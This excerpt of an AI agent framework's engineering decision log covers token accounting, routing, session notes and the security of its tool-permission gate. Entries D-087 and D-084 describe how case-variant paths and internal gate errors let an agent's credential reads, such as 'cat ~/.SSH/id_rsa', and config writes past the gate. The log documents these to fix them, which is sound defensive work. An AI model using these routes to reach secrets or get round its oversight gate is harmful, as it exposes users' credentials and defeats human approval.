    chatty shell command queued 7,946 publishes in one turn. `run_tool` now joins a thread's chunks into one
    `tool.output` per loop turn, so a turn publishes a handful: a delta per provider chunk, an output per running tool.
- **Rejected:** dropping the oldest events, since a gap with no close corrupts a client's view. Blocking the
  publisher, since one slow client would stall every turn and every other client. Refilling the stalled
  subscription from the event log inside the hub, which hides the stall from a remote client and moves reconnect
  logic into the hub. Closing on a stall measured in seconds, since one long loop turn looks the same and memory
  still grows while the timer runs.
- **Revisit if:** a client that keeps up is ever ended in normal use, or new code publishes from a thread once per
  item instead of once per loop turn.
- **Docs:** `docs/CORE-V2-INTERFACES.md` `events.subscribe` and `tool.output`, `docs/STANDALONE.md` §5.1,
  `docs/ui/WEB.md`, `plugins/exo-command/README.md`, `CHANGELOG.md`.

## D-080 (2026-10-16) One meaning for `Usage.input_tokens`, and what the per-child token budget counts
- **Status:** Accepted 2026-10-16. It replaces the `input_includes_cache` flag that D-032 #6 added for pricing.
- **Why:** the two transports filled `Usage.input_tokens` differently. Anthropic reports only the uncached input,
  with cache reads and writes apart. The OpenAI transport copied `prompt_tokens`, which already holds the cached
  tokens. Only pricing knew. Every other reader assumed one meaning and got the other half the time:
  - The delegate budget (200,000 tokens per child) counted `input + output`. On Anthropic, where caching is on by
    default, it ignored the cached context and barely acted. On OpenAI-style routes it counted the whole cached
    prompt on every call, and a child with a 92k prompt was stopped after 3 calls.
  - The TUI context gauge read about double on OpenAI routes (182,012 for a 92,012-token prompt), and the cache
    share read 49% where 98% was real.
  - Context-engine plugins got `prompt_tokens` = `input_tokens`, so on Anthropic they saw only the uncached tail
    and usage-driven compression never fired.
- **Decision:**
  - `input_tokens` is the uncached input on every transport. Cache reads and writes are counted apart, so the
    prompt a call sent is the sum of the three. The OpenAI transport reports `prompt_tokens - cached_tokens` as
    input and the cached count as cache reads. A cached count it cannot split (above the prompt, negative, not
    an integer) makes the usage incomplete, so the spend boundary refuses it and keeps the reservation. Without a
    spend policy the whole prompt stays uncached input. The router prices `input_tokens` directly. Cost and
    settled spend are unchanged on both transports.
  - The per-child budget counts what the child newly processes: uncached input plus cache writes plus output.
    Cache reads do not count. The receipt's tokens in are the same count.
  - Readers that need the prompt size add the three counters: the TUI and web context gauges, the cache share
    (cache reads over the whole prompt), and the `prompt_tokens` handed to context engines.
  - A context engine gets the usage of the turn's last model call (`TurnResult.last_usage`), so `prompt_tokens`
    is one prompt. The turn's sum would count the cached context once per call: three calls of a 30k prompt read
    as 90k, so a 75% threshold could fire after one tool-using turn with the window less than a third full.
- **Rejected:**
  - Keeping the flag and teaching every reader about it: each new reader would have to know, and four did not.
  - Counting all context processed (`input + cache read + cache write + output`) for the budget: every round
    re-reads the cached context, so a child re-reading 25k tokens a round would stop after about 8 rounds, where
    today it effectively never stops on the default provider.
  - Counting only uncached input plus output: cache writes are new tokens at a higher price, and leaving them
    out keeps the budget blind on Anthropic.
- **Revisit if:** a transport reports cache counters in yet another shape, or children hit `budget` on routes that
  report no cache counts at all (local servers with their own prompt cache), where every call's full prompt counts.
- **Follow-up:** `spend.py` and `billing.Price.actual` still take an `includes_cache` argument, now always false.
  Remove it once PR #129 (tiered spend rates, same files) lands.
- **Validation:** `tests/core/models` (transport split, router price, spend settlement), `tests/agents`,
  `tests/clients/tui`, `tests/core/plugins`, `tests/trace`, the core budget test, `ruff check`, the mypy baseline.
- **Docs:** `docs/TRACE.md` "Cost", `docs/MODEL-SPEND.md`, `docs/CORE-V2-INTERFACES.md`, `docs/AGENT-WIRE.md`
  "Limits", `docs/UI.md`, `CHANGELOG.md`.

## D-081 (2026-10-17) The gate's decision call never uses the main model
- **Status:** Accepted 2026-10-17 by the lead (reversible). It amends D-019 for the gate only. The gate's chain is
  Jev, then local Laya, then `aux`. `exo decide` and the baseline export's judge keep the full chain, `main` last.
- **Why:** a user-readiness audit of main 35b7de8 found that with only the claude CLI on PATH (the route Exo picks
  for anyone with Claude Code and no key), every tool call the rules allowed started a hidden main-model call. Each
  one added 2 to 10 s and was missing from `/trace` and cost. When one failed, the router cooled the one CLI login,
  and the user's next turn failed with "all routes for 'main' failed or are cooling down" for about 60 s. D-015
  already rejected "a frontier model for every small decision (cost, latency)". The fallback to `main` made it the
  default on the CLI route.
- **Decision:** `ask_choice_result(..., spare="main")` skips every route in the `main` chain, including one also
  listed under `aux`. A failure on that call cools only the model that failed (`credential|model`), never the
  credential. The gate passes it on every call. With no decision or aux route the gate keeps the rule outcome, as
  it already did on a failure or a timeout. Exo's own read-only tools (`skill`, `memory_zoom`, `exo_trace`, `ui`)
  are `read` in `gate.TOOLS`.
- **Rejected:**
  - Dropping `main` from `ROLE_FALLBACK["decision"]` for every caller. It changes `exo decide` and the baseline
    judge, which run once per command, not once per tool call.
  - Skipping the decision call for `read` tools only. Writes, shell and web calls would still wait on the main
    model and could still cool its login.
  - Keeping `main` and only cooling per model. Every tool call would still pay for a main-model call.
  - No cooling at all on a side call. A failing aux model would be retried on every tool call.
- **Revisit if:** a local decision model ships by default (exo-decide, or Laya from the installer), or a principal
  wants the main model's second opinion on the gate. That would be an explicit setting, not the fallback.
- **Validation:** `plugins/exo-gate/tests/test_exo_gate_side_calls.py`, `tests/core/models/test_decision_spare.py`,
  and a first launch from a clean home with the claude CLI: no approval card for the intro skill, no decision
  call to the CLI, and read-only tool calls at 0.0 s.
- **Docs:** `docs/GATE.md` "The decision model's second opinion", `docs/PROVIDERS.md` "Roles", `CHANGELOG.md`.

## D-082 (2026-10-17) Canary operating decisions: verify first, hold high-exposure posts, finish adjacent work
- **Scope pending:** The read-back requirement and the corresponding rejected item below conflict
  with Rule 4 in `skills/choreography/references/anti-loop-discipline.md` for local file changes.
  Their scope is undecided and should not be treated as a settled instruction until resolved.
- **Decision:** how agents working on and in Exo operate, from canary use (agent exo-razi):
  - Verify by read-back before claiming an action is done (re-read the file, grep the result, fetch the
    record). Never invent a URL or claim a send that was not confirmed.
  - A failed bus or message send is reported as failed. It is never silently replaced with another
    channel and described as sent.
  - High-exposure or external posts wait for the principal's explicit go-ahead.
  - Inside delegated scope, finish the named work and the adjacent work end to end. Ask only for
    irreversible or key picks (spend, model, name, price, logins); do not hold deliverables for
    picks the delegation already covers.
- **Why:** correction clusters during the canary day: unverified "done" claims, and pick-questions
  asked inside fully delegated blocks instead of acting.
- **Rejected:** holding delegated work for confirmation picks; substituting a channel on send
  failure; posting externally without release; skipping the read-back after a fix.
- **Revisit if:** the principal resolves the read-back scope or the available verification tools change.
- **Origin:** local canary notes appended to DECISIONS.md in the live install on 2026-10-17
  (numbered D-074 and D-075 locally). Those numbers were claimed by unrelated gate PRs
  (#125, #126); #125 closed without merging, while #126 landed as D-075. The notes are recorded
  here under a new number, recovered during the
  2026-10-18 exo-live update. Team operating record, not product behaviour.
- **Docs:** this entry.

## D-087 (2026-10-26) A store or secret name matches in any case (issue #601)
- **Status:** Accepted 2026-10-26 (gate security; strictness only grows). It amends the case-sensitive note in
  D-074's limits and the same limits in `docs/GATE.md`.
- **Why:** on a case-insensitive file system (default APFS) `.exO/config.json` IS `.exo/config.json`, but every
  store and secret name check read the spelling as written, so a case variant walked past: on main a8a4ffbd,
  `cp /tmp/x ~/.exO/config.json` and `cp /tmp/x $HOME/.EXO/config.json` were `shell`/allow where the plain
  spelling is a `store_write` ask, `echo x > ~/.KUBE/config` a `local_write`/allow where `~/.kube/config` is
  `credentials`, and `cat ~/.SSH/config` a read where `~/.ssh/config` asks. `realpath` does not canonicalise
  case, so the resolved spelling kept the variant (`_path_forms`). The `id_rsa` name in `cat ~/.SSH/id_rsa`
  asked already, matched anywhere.
- **Decision:** every store and secret name matches in any case. The name regexes (`_STORE_NAMES`,
  `_CONFIG_NAME`, `_RUN_DIR`, `_SENSITIVE_PATH`) are searched on the folded text (`_fold`), the list itself
  compiled twice (`_SENSITIVE_PATH_F`) because `Netlify` in it is mixed-case, which a lowered text would not
  meet; the plain compares (store roots and code folders, protected parts, the `cd`-store hints, `_could_be`,
  the glob samplings) fold through `_fold`. A glob part folds when it holds no wildcard — a folder the file
  system opens (`~/.EXO/*`, `~/*/RUN/x`) — and stays as written when it holds one, as bash matches it against
  the entries case-sensitively (`[HOME=x]*`, `~/.e*O/*`; `_fold_glob`). `EXO_GATE_CASE_SENSITIVE=1` reads main
  d800f33c's case-sensitive names instead, for a file system whose `.exO` is a different folder; the tests pin
  both readings. An ssh hop whose remote command names a case-variant store path keeps the host beside the
  line's own action in the reserved parts (`_fold_made`), as main listed it while the path read as an ordinary
  one.
- **Cost:** on a case-sensitive file system a distinct `.exO` folder asks, and `cert.PEM` or `NOTES.ENV` count
  as keys and env files — the fail-closed side, as for a glob that could name one. A case variant of a store
  folder before a wildcard asks as a `cd` into it does (`ls ~/.EXO/*`).
- **Limits:** descriptor and process folders (`/dev/fd/3`, `/proc/self/environ`) still match as written, as do
  every env-spelled path beside its own spelling (`EXO_HOME`'s own case); a glob part that holds a wildcard is
  bash's matching, not the file system's (`~/.e*O`, `[HOME=x]*`).
- **Validation:** `tests/security/test_gate_store_name_forms.py` ("a case variant of a store or secret name
  asks", both readings), `tests/security/test_gate_config_store.py`, `tests/test_gate_diff.py` (the loosening
  patches re-anchored), and `scripts/gate_diff.py --base main --head .` printing `nothing lowered` with the
  issue's five rows added to the corpus as tightened pairs.
- **Docs:** `docs/GATE.md` "Store-path checks", "Secret-store paths", "Search tools", "Change limits",
  `CHANGELOG.md`.
- **Plugin binding follow-up (2026-10-23, #498):** `exo.plugin_lifecycle.PluginToolBridge` now owns the
  Hermes-compatible tool/slot adapters and lifecycle-verdict translation previously inside `CoreRuntime`.
  `PluginManager.bind_tools` takes explicit collaborators, including the existing approval desk and a
  live required-mode callback. Core helper shims preserve compatibility. This is a behavior-preserving
  extraction: no approval policy, binding, private-thread rule or protocol contract changed. It restores
  the standard core allowance (D-077 amendment above); broader private-state query cleanup remains open.
  User-guide impact: none. Developer-guide impact: the runtime-binding interface and extension location.

## D-086: Optional session working notes

- **Pending proposal:** [Agent and human work vessel](docs/AGENT-OPERATOR-DESIGN.md)
  proposes client use of these notes and further acceptance gates. This pointer
  approves no new behavior, policy or defaults.

- **Date:** 2026-10-23
- **Status:** In progress. Implemented for review in [#506](https://github.com/aska-digital/exo/issues/506).
- **Problem:** A long task's current goal, constraints, blockers and next action can become scattered
  across the transcript. Existing handoffs extract signals, while delegated tasks describe execution.
  Neither is an explicit, revisioned working document for the current conversation.
- **Decision:** Add an optional `work_notes` tool and principal-only `/work` read command. Save
  complete revisions in the existing session database, with transactional revision comparison.
  Composition is controlled by `work_notes.enabled`, false by default in every harness profile.
- **Continuity:** Resume the same session with a bounded deterministic snapshot. Feed it into the
  existing handoff facts. Forks start empty. Child and scheduled sessions cannot use the notebook.
  Undo makes notes stale when their transcript anchor is hidden or removed. Stale bodies remain
  explicitly readable, but prompts and handoffs suppress them until revised.
- **Evidence and authority:** Validate message and completed-tool references against visible records
  in that session. Record presence is not claim verification. Notes always have agent authorship,
  are scoped to the engine agent and recorded principal, and cannot grant permission or execute steps.
  Tool calls and command reads use the existing gate and executor. No new approval or ledger path.
- **Gate classification:** Valid `read` and `history` actions are `read`. Valid `update` is `local_write`.
  These classifications require the action's supported top-level keys. Calls without a valid action or
  with unsupported keys keep generic classification, including secret and store path checks.
  Main's comparison script at `5a9dc394` checked notebook code at `042c896e`: 152 calls across all 87
  policies, or 13,224 pairs. All 35 previously lowered notebook calls are included. The 32 calls
  responsible for 2,167 missing-action lowerings now have none. Another 108 cases pair supported actions
  with unsupported keys, with no lowerings. Nine intentional read/history differences remain for
  policies targeting `unknown`. Update tightens four pairs. No reserved protections or posting
  violations are lost, and neither tree has classification or decision errors. The registry and handler
  validate field values beyond the classifier's action and key checks. The corpus and results are in
  `docs/evidence/work-notebook-gate-2026-10-23.json`. This focused comparison does not cover other tools.
- **Limits:** Strict nested fields, document byte limits, bounded snapshots and history listings.
  A per-session revision ceiling refuses further writes without deleting history. The feature owns
  no separate database, workers, model calls or automatic retention job.
- **Rejected:** Autonomous task goals, a second task scheduler, promotion of agent notes to principal
  memory, automatic cross-session inheritance, silent conflict merges and durable question continuations
  in this change. Runtime question continuation needs its own state and delivery contract.
- **Validation:** Real composed fake-provider turns through the real gate, gate and required-executor
  denial, restart, concurrent connections, principal/private/session isolation, undo, forks, evidence
  checks, disabled composition, workspace instructions and handoff snapshots.
- **Docs:** `docs/WORK-NOTEBOOK.md`, user guide §1, developer guide §1, command reference, docs map and
  changelog. Whitepaper coverage is deferred to the next batch.

### D-086 amendment: automatic record-derived continuity (2026-10-27)

- Add a separate default-on `work_checkpoint` index, controlled by `enabled` and
  `resume_chars`. It is not an agent-authored notebook revision or a task runner.
- Reconstruct from the latest 40 visible session messages and 8 job metadata rows;
  render at most 12 tool records, newest first, within the configured character
  budget. Capture at turn end and before compression, and reconstruct before
  injection so abrupt restart recovery does not depend on shutdown hooks.
- Ordinary root threads only; exclude private, child/fork, scheduled and other-agent
  sessions. Bind saved rows to the configured principal. Undo excludes reverted
  transcript facts and suppresses jobs whose schema has no transcript anchor.
- Copy no conversation text, tool arguments/output, commands, paths or job logs.
  Tool success is a reported result, not effect verification. Interrupted or
  missing results explicitly leave effects unknown. Nothing is automatically replayed.
- `/checkpoint` requires a principal connection. It exposes record metadata without
  a new approval path. Existing manual working notes and their gated tool are unchanged.
- This is a bounded slice of #683: filesystem diffs, task-goal synthesis and child
  work tracking remain outside scope. Docs: `docs/WORK-CHECKPOINT.md`, user/developer
  guides, command reference, docs map and changelog; whitepaper deferred to next batch.

## D-083 (2026-10-26, amended 2026-10-27) The core budget prices coupling, not only lines, and has no ceiling
- **Counter clarification 2026-10-27:** after resolving a relative import to `exo`, inspect its imported names
  with the same real-module lookup as `from exo import ...`. This closes a spelling gap without counting exported
  symbols, changing exclusions or counting repeated dependencies twice. Existing counts and caps remain 39 and 8.
- **Status:** Accepted 2026-10-26 by the lead (reversible), amended 2026-10-27 by the principal's ruling "we're
  dropping the ceiling for now as we build out the codebase, it was too restrictive". It amends D-077: the line
  ceiling is off, and two of the engine split's step 4 numbers are assertions instead of printouts. The floor and its
  ratchet stand.
- **Why:** on 2026-10-26 at `dcab371a` main counted 15,812 of the 15,813 lines the ratchet then allowed, so one line was
  left. It has moved since: #598 raised the headroom by 11 to 1,011 and the count rose past it, so on 2026-10-27 `main`
  at `13cea687` counted 15,828 against a 15,824 ceiling and `test_core_line_budget` failed on `main` while the work it
  blocked was ordinary product work. Raising the headroom again would only move the same wall, and the principal's
  ruling names the wall itself as too restrictive. D-077's own record went from 14,999 (2026-10-15) to that count in
  twelve days, and the two rule-4 raises so far (#314 +58, #346 +29) were each undone by the reduction they called
  for: the number was never the thing that kept the core lean, the structure was. The count is also pricing size alone,
  while D-077's point 5 names structure as the real goal, and structure was only printed.
- **Decision:** `tests/integration/test_wave1_acceptance.py` no longer records `CORE_HEADROOM` and no longer asserts
  anything about lines. It keeps `CORE_FLOOR = 14813`, keeps the floor's ratchet-down rule, and prints the count and
  its distance from the floor on every run. It records `INWARD_IMPORTS_MAX = 39` and
  `PRIVATE_STATE_MAX = 8` and asserts them in the same test, from a `_scorecard` helper that walks `src/exo/core`
  with `ast`:
  - *inward product imports* count every import of a non-core `exo` module from the core (`exo.model_spend`,
    `exo.bus`, `exo.gate`, `exo.envscrub`, `exo.wire`, and so on), in every form the statement can take: `import a.b`,
    `from a.b import c`, `from exo import b`, and the relative form. This is the import direction ENGINE-SPLIT step 4
    asks for.
  - *cross-module private-state reads* count reads of another module's private state: a `_name` attribute read that
    is not a call and is not reached through `self` or `cls`, where `_name` is not a name the reader module defines
    or assigns itself (a module-level name, a function or argument name, or the reader's own attribute). The
    exemption is the reader's own names, not its class body only, which is what the helper measures.
  - Both numbers ratchet down like `CORE_FLOOR`: a reduction sets the constant to its new, lower count. Neither may be
    raised to make a false positive pass; fix the reader instead.
- **Rejected:**
  - Keeping the headroom at 1,000 and cutting before the next fix. Rule 4 forbids blocking a security or robustness
    fix on the count, and the count was already at one line free.
  - Raising the headroom again in this PR. It leaves the same gate in place at a higher number and it failed on
    `main` anyway, so the next ordinary feature would break it again.
  - Setting `CORE_FLOOR` to the current count to make room. The floor never goes up (D-077).
  - Counting every read of a private name. Most are not state at all (methods, module helpers, locals): about 590,
    and the number moves with unrelated edits. Counting method calls on private names is about 353 for the same
    reason.
  - Allow-lists by name. They hide the reads instead of counting them, and they rot.
- **Numbers:** measured 2026-10-26 on the branch after merging main `dcab371a` (`0d680b83`): 15,812 counted lines in
  58 files, against a floor of 14,813. Re-measured on the landing head, after merging main
  `13cea687`: 15,828 lines in 58 files against the same floor, 39 inward imports (cap 39) and 8 private-state reads
  (cap 8).
  Step 4, counted over every import form: 39 inward imports (by
  module `exo.bus` 4, `exo.gate` 4, `exo.provenance` 4, `exo.model_spend` 4, `exo.crypto` 3, `exo.config` 3,
  `exo.envscrub` 3, `exo.principal` 2, and 1 each for `exo.application`, `exo.capture`, `exo.compose`,
  `exo.diagnostics`, `exo.learn`, `exo.models_cmd`, `exo.plugin_context`, `exo.providers_setup`, `exo.search_worker`,
  `exo.store`, `exo.turn_settle`, `exo.wire`) and 8 private-state reads (`loop._state` 3 in `engine.py`,
  `hub._subs` in `jobs.py` and in `peer_target.py`, `loop._state` 2 in `peer_target.py`, `loop._state` 1 in
  `agents/delegate.py`).
- **Revisit if:** the two step 4 caps stay still for a long stretch, or a ceiling is wanted again. Bring back a
  number only with a recorded reason and a value the tree is already under.
- **Validation:** at head `b1017433`, after merging main `13cea687`, `tests/integration` with `tests/docs` and
  `tests/core` gave 1,315 passed and 1 skipped in 85.06s, including the six `test_core_line_budget` cases. With the
  ceiling off, the same six pass on a tree that counts 15,828, where they fail on `main` at `13cea687`.
- **Docs:** `docs/ENGINE-SPLIT.md` "Budget policy", `docs/DEVELOPER-GUIDE.md` §7, `docs/WHITEPAPER.md` §27,
  `docs/DOCS-MAP.md`, `CHANGELOG.md`.

## D-084 (2026-10-27) An internal gate error asks once, and only once
- **Status:** Accepted 2026-10-27 in aska-digital/exo-desktop #23 (orda-aska, ahrazzle, sparky-118); ported to
  exo in #742, with the removal of `_SAFE_ON_ERROR`, `gate_diff`'s error model, the bypass and observe tests and the
  Cost, Limits and Validation below in its follow-up. D-084 is the same number in both repos; see exo-desktop #77.
- **Why:** when the gate's own checks raised, the exo-gate hook's error path returned no card for a read tool (the
  `_SAFE_ON_ERROR` set: every tool `gate.TOOLS` calls `read`), so the read was allowed silently. Its card was
  once-only only when the gate still read a store write, so an "always" answer to any other error card stood as a
  grant for every later error on that tool, and a secret whose check raised got a card any approver could answer.
  A read is not harmless when the gate cannot say what it reads: a broken policy pattern or a classifier bug then
  let any `read_file` or `search_files` run unasked. On main `cd371aed`, with `gate.classify` or the rules lookup
  raising in enforce mode, `read_file README.md`, `search_files .` and a call with non-dict arguments returned no
  card, in ordinary and bypass sessions, with the decision model on and off.
- **Decision:** when the gate's own checks raise, the hook asks with an approval card, reads included. The card is
  once-only in every mode, bypass included: the core offers allow and deny, an "always" answer gives no grant and
  runs nothing, and the next such error asks again. A call the gate still reads as a store write or a secret goes
  to the principal alone, in every mode (D-033); a secret check that raises counts as a secret. Observe mode still
  lets a call ahead when the gate does not read it as a store write or a secret, and logs the error. A required
  executor still blocks (D-020). `_SAFE_ON_ERROR` is removed: nothing in exo reads it any more, and
  `scripts/gate_diff.py` models an error as an ask for every tool.
- **Cost:** an unattended run now waits on such a read until someone answers or the turn is stopped.
  `approvals.ask` has no timeout, and "Default if no reply: skip" is only the card's text.
- **Limits:** when classification itself raises, the gate cannot see a store path or a secret named inside a
  shell command; the secret check reads only path arguments. Unless that check finds a secret, a store write or a
  command such as `cat ~/.ssh/id_rsa` then gets a once-only card any approver may answer in enforce mode, and goes
  ahead in observe mode as it did before.
- **Validation:** measured against main `cd371aed`, before #742. A hook probe that makes `gate.classify`, the rules lookup,
  `gate.args_sensitive`, or the rules lookup and `gate.args_sensitive` together raise, over enforce and observe,
  ordinary and bypass sessions, the decision model on and off, and seven calls (`read_file README.md`,
  `read_file ~/.exo/keys/seat.key`, `search_files .`, `terminal ls`, a store write, non-dict arguments,
  `terminal cat ~/.ssh/id_rsa`): 224 cases, 136 stricter, 88 the same, none lower. Main's `scripts/gate_diff.py` (`--no-variants --jobs 2 --timeout 0`) found
  nothing lowered on 12,164 actions x 88 policies and nothing lowered or tightened on 18 aimed read, search, secret
  and store actions. `plugins/exo-gate/tests`, `tests/integration/test_required_gate.py`, `tests/security`,
  `tests/docs`, `tests/test_gate_diff.py` and `tests/test_type_baseline.py` gave 12,208 passed and 117 skipped. The
  branch's changed test files on main's code: 18 failed, 421 passed; the 18 are the new and changed error-path rows.
- **Docs:** `docs/GATE.md` "An internal gate error asks once (D-084)" (before "Who answered"), the store section's
  fallback line, the read-only tools paragraph and the bypass "Not covered" line; `docs/EXECUTORS.md`;
  `docs/DEVELOPER-GUIDE.md` (`gate_diff`'s error model); `docs/DOCS-MAP.md`; `CHANGELOG.md`. Tests:
  `plugins/exo-gate/tests/test_hook.py`, `plugins/exo-gate/tests/test_bypass.py`,
  `tests/integration/test_required_gate.py`, `tests/test_gate_diff.py`.

## D-089 (2026-10-28) One shared implementation, then reviewed desktop syncs
- **Status:** Accepted by the principal, effective for new work. [Decision discussion](https://github.com/aska-digital/exo/discussions/746).
- **Decision:** shared core, plugins, web UI and their docs and tests are implemented and reviewed in Exo. Native desktop shell, packaging and sync tooling belong in Exo Desktop. The fork takes batches of merged Exo commits through a reviewed sync PR. Automation prepares drafts and never pushes or merges directly into main.
- **Why:** parallel implementation PRs duplicate review and allow fixes, policy and parent branches to drift apart.
- **Existing work:** authors retain ownership. Preserve unfinished PRs and unique desktop files until the canonical change is merged and downstream integration is verified. An urgent alpha carry names its canonical PR, owner and reconciliation step.
- **Rejected:** routine duplicate feature PRs, unreviewed automatic main updates and closing legacy work solely because routing changed.
- **Revisit if:** repository consolidation or a separately versioned desktop dependency removes the need for a fork. No such migration is authorized by this decision.
- **Docs and user impact:** `docs/REPOSITORY-WORKFLOW.md`, developer guide section 8, repository agent instructions and the fork's continuity guide. No runtime or user setting changes.
- **Amendment 2026-10-29 (#842): `CHANGELOG.md` merges with git's union driver.** Nearly every PR adds a bullet near the top of `[Unreleased]`, so each merge to main conflicts with every open PR that also touched it. Its author has to merge main by hand and push again, which stales the review of the exact head. A one-line `.gitattributes` (`CHANGELOG.md merge=union`) keeps both sides' lines instead. Measured on main `50e2560b` over 98 open PRs: 85 conflicted with main, 46 of them in `CHANGELOG.md` and 19 in `CHANGELOG.md` alone. With the attribute, `CHANGELOG.md` conflicted in none, and 19 more PRs merged cleanly. None of the 46 deletes or edits a changelog line, so union only has to keep two sets of added lines, and it does: every line each side added is in the result.
  - **Not extended to** `DECISIONS.md` or `docs/DOCS-MAP.md`. Two branches that edit the same row, or both add a `D-NNN` heading, must conflict; union would keep both silently (#648).
  - **Limit:** git reads the attribute from the checked-out branch, so a branch cut before it lands still conflicts on `git merge main` until its clone adds the line to `$(git rev-parse --git-common-dir)/info/attributes`, the form that also works in a linked worktree (developer guide section 8). A rebase or cherry-pick onto main needs no step. In a bare repository `git merge-tree` reads attributes from HEAD, so GitHub's mergeability check and merge button likely apply union too; a changelog-only PR such as #424 will confirm it once this lands.
  - **Limit:** after a release cut, an open PR's entry that sits where the new `## [X.Y.Z]` heading goes merges into the released section with no conflict, and nothing repeats, so `tests/test_merge_attributes.py` does not see it. The release steps (developer guide section 8, "Cutting a release") say each open PR checks which heading its entries are under after it merges main.
  - **Limit:** union does not keep an entry under its heading. Git takes two changes a few lines apart as one hunk, and union keeps both sides' copy of that hunk with the lines between. When both sides add under one heading and under the next one just below it, an entry can move to the next heading and the lines between repeat, with no conflict. `tests/test_merge_attributes.py` makes the repeat visible: it fails when a version section of `CHANGELOG.md` holds a bullet twice or a `###` heading with nothing under it. Main has neither today. Where an entry sits stays a reviewer's check.
  - **Rejected for now:** changelog fragments (one file per PR under `changelog.d/`, assembled at release). That ends the conflicts for new PRs entirely, but it changes the docs rule and the release steps, so it needs its own decision.
  - **Docs and user impact:** `.gitattributes`, developer guide section 8 "Branch and merge", `tests/test_merge_attributes.py`. No runtime or user setting changes.
- **Proposed guidance 2026-10-30 (#1008):** Document GitHub's native stacks, issue artifacts and CLI media alongside the existing author-owned workflow. This guidance is advisory until the principal accepts it. Until then the author and review flow in `docs/REPOSITORY-WORKFLOW.md` governs.
  - These tools do not change independent current-head review, required checks, merge authority, desktop sync or installation boundaries.
  - Inventory and coordinate any existing stack with its owners before modifying it. A tool's ability to rebase or merge several branches is not authorization to do so.
  - **Docs and user impact:** `docs/REPOSITORY-WORKFLOW.md` "GitHub collaboration tools (proposed guidance)", developer guide section 8. No runtime or user-guide change.

## D-091 (2026-10-29) A failed model list says which failure it was, and offers a retry only where one helps
- **Status:** Accepted, effective for the next release.
- **Decision:** `GET /api/providers/models` keeps its 200 shape (`models`, `available`) and adds three fields on failure: `error` (a sentence, already passed through `redact_secrets` and capped at 300 characters), `error_class` (`transport`, `authority` or `other`) and `retryable` (true only for `transport`). The Providers page shows the sentence in place of the picker and puts its "Try again" button behind `retryable`.
- **Why:** the route answered `"core unreachable (<ExceptionName>)"` for every failure, including a core that answered and refused the caller. That reads as a broken connection, so the page could only offer a retry that changes nothing, and an exception class name was the whole diagnosis. Issue #756 is the same defect on the chat side: guidance must follow the failure class, not the fact of a failure.
- **Safety:** the guard is unchanged (D-034): loopback peer, matching Host and Origin, page token. D-081 is unaffected: the model list still never runs on the main model. The sentence is built by `core_failure()` in `source.py`, which never includes an address or an exception name, and only for the transport class; the constant is the same one `core_message()` uses, so the page and the socket path cannot drift.
- **Rejected:** a 503 or 502 status for the models route. The page calls it on every load and treats a non-200 as "no models", which hides the reason; a 200 with an error field lets the caller decide. Also rejected: retrying inside the route. The route runs on the request, and a retry decision belongs to the person reading the sentence.
- **Docs and user impact:** `docs/ui/WEB.md` (Providers section), `docs/COMMANDS.md` unchanged, `CHANGELOG.md`. No settings change, no new key handling.
- **Amendment 2026-10-29 (#856):** the classes follow what a real core answers.
  - `REFUSAL_CODES` names `forbidden` and `unauthorized`, but `models.list` never checks principal authority. The refusal a real core does send is the HTTP layer's: a core on TCP answers `401 {"error": "bearer token required"}` to a wrong or missing bearer token before it reads the command. The client turns that into `SourceError("http_401", ...)`, which was classed `other` with the raw JSON as the sentence. `core_failure()` now classes `http_401` and `http_403` as `authority` (`TOKEN_REFUSED`), with a sentence that names `--token-file` and `$EXO_HOME/run/exod.token`, and no retry.
  - The Safety line above said the sentence never includes an exception name. That held only for the transport class: `CommandFailed` and `SourceError` are not `RuntimeError`, so they read `CommandFailed: internal: router is busy`. An exception that carries the core's `.message` now shows that message alone.
  - `core_message()` shares both changes, so the connection state gets the token sentence and loses the class name too. The chat routes reply through `api.error_reply()`, whose `SourceError` branch shows the core's `.message` as it is: for `http_401` and `http_403` it now uses `core_message()`, so a refused token reads the same there, with its `code` kept. Other codes keep the core's words, which never carried a class name.
  - Tests in `plugins/exo-command/tests/test_providers_routes.py`:
    - `test_a_core_on_tcp_that_refuses_the_bearer_token_is_an_authority_failure` puts a real `HttpServer` on TCP behind a `ClientSource` with a stale token, and asks both the model list and `POST /api/chat/sessions`.
    - `test_a_key_value_in_a_failed_model_list_never_reaches_the_page` is the redaction test the PR for this decision listed but never added. It fails with `redact_secrets` taken out.
    - The parametrized test gains `http_401`, `http_403` and a `SourceError` case, and asserts that no class name or raw JSON reaches the page.
  - On main, five of the cases fail.
  - #856's points 3b and 4 are about the page: a browser test of the three states, and the button after a fetch-level 403. They wait for #850, which rewrites `loadModels` and `retryModels`.
## D-092 (2026-10-30) The page's key advice follows the error, not the fact of an error
- **Status:** Accepted for implementation in this PR. Records after D-091 (#845).
- **Decision:** the one dim guidance line reads the recorded model error text. An authentication or permission failure ("HTTP 401", "Incorrect API key", "invalid x-api-key", "authentication", "permission denied") may send the reader to the Providers page. A transport failure (`ReadError`, `ReadTimeout`, `ConnectError`, "stream ended without a response", network and unreachable wording) says the model could not be reached and offers no key advice. Text that reads as neither gets a general line pointing at `/trace`. No text at all (an older core, or a boolean flag) gets the general line too.
- **Why:** issue #756. The line fired on any `model.call` with an error, so a dropped connection told the person to check keys. A wrong suggestion costs a reader real time and hides the actual failure. The page already receives the error string in the `model.call` body; it only threw it away.
- **How:** `providerErrorKind()` in `static/complete.js` classifies the text (auth wins over transport when both match); `Guide.rules()` turns the kind into one of three keys (`providers:auth`, `providers:transport`, `providers:error`) so each keeps its own twice-a-session count. `static/chat.js` passes the error text instead of a boolean. Classification is local: no core change, no request at tip time, no new event field.
- **Rejected:** a new `error_class` field on `model.call` as the only signal (an older core would leave the tip silent, and the text is already there); a single softer sentence for every error (it is the specificity that makes the line worth showing).
- **Revisit if:** the core records a structured error category on `model.call`, in which case the classifier should prefer it and keep the text as a fallback.
- **Docs and user impact:** `docs/ui/WEB.md` guidance paragraph, `docs/DOCS-MAP.md`, `CHANGELOG.md`. No new command or setting; nothing about keys is stored or shown.
- **Amendment 2026-10-29 (#855):** the classifier reads what a real core records.
  - A failure before any output is retried, and while the route cools down the router answers "all routes for 'main' failed or are cooling down; next route reopens in 60s". The cause (`ReadError`, `ReadTimeout`, `ConnectError`) is only in `attempts[].error`, so the page classifies the error joined with its attempts' errors (`providerErrorText`). `chat.js` hands the attempts to the guide beside the error.
  - httpx names its timeouts `ReadTimeout`, `ConnectTimeout` and so on, with no word boundary before `Timeout`, so the transport pattern takes `(read|connect|write|pool)timeout`.
  - The router words its own refusals: "rejected the key", "refused the login" (a CLI login such as claude-cli's "Not logged in" or an expired OAuth token) and "no credentials for role". Each reads as a refusal and points at the Providers page.
